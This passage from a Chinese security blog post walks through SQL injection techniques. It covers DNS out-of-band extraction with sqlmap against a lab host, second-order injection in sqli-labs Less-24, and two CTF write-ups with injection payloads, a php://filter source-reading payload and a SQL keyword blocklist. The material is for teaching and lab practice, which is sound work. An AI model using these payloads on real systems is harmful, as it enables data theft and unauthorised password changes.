data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png\" alt=\"image-20221020164251704\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png\" alt=\"image-20221020164324361\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png\" alt=\"image-20221020164355711\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png\" alt=\"image-20221020164422616\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png\" alt=\"image-20221020164445444\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png\" alt=\"image-20221020164512708\"></p>\n<p>添加转发，dns 域随便写什么，但 IP 攻击机的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png\" alt=\"image-20221020164603923\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&quot; --technique=T --dns-domain &quot;hahaha.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=\">搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=\">使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)</span></p>\n<p>如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机</p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<h6 id=\"网鼎杯-2018comment\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018comment\">#</a> [网鼎杯 2018] Comment</h6>\n<p>1. 密码爆破，自己去 burp 里面玩吧</p>\n<p>2.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  origin master// 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<p>通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描</p>\n<p>最后还原出的源码是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//write_do.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                title = &#x27;<span class=\"subst\">$title</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./comment.php?id=<span class=\"subst\">$bo_id</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board set category = &#x27;<span class=\"subst\">$category</span>&#x27;, title = &#x27;<span class=\"subst\">$title</span>&#x27;,content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"comment\">//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];    <span class=\"comment\"># 注意这行，在从数据库中取出数据时没有过滤，存在二次注入</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">        set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中</p>\n<p>这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \\ 并不会插入数据库</p>\n<p>接下来构造注入语句：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png\" alt=\"image-20221023180732878\"></p>\n<blockquote>\n<p>这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误</p>\n<p>在覆盖的同时，我们的注入语句也在自己写的 content 中</p>\n<p>最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了</p>\n<p>最后的语句为：</p>\n<p>insert into board set category = ‘a\\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;</p>\n<p>此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png\" alt=\"image-20221023181703773\"></p>\n<p>接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库</p>\n<blockquote>\n<p>category 取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了</p>\n<p>然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉</p>\n<p>最后语句变为了</p>\n<p>sql =` \"insert into comment set category = 'a',content=database(),/*', content = '*/#', bo_id = 'bo_id’&quot;;`</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png\" alt=\"image-20221023181848314\"></p>\n<p>得到库名，下面的 getflag 操作不在赘述</p>\n<h6 id=\"2ciscn2019-华北赛区-day1-web5cyberpunk\"><a class=\"markdownIt-Anchor\" href=\"#2ciscn2019-华北赛区-day1-web5cyberpunk\">#</a> 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk</h6>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，</p>\n<p>在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//confirm.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//var_dump($_POST);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"variable\">$user_name</span>.<span class=\"string\">&quot;已提交订单&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;sss&quot;</span>, <span class=\"variable\">$user_name</span>, <span class=\"variable\">$address</span>, <span class=\"variable\">$phone</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span 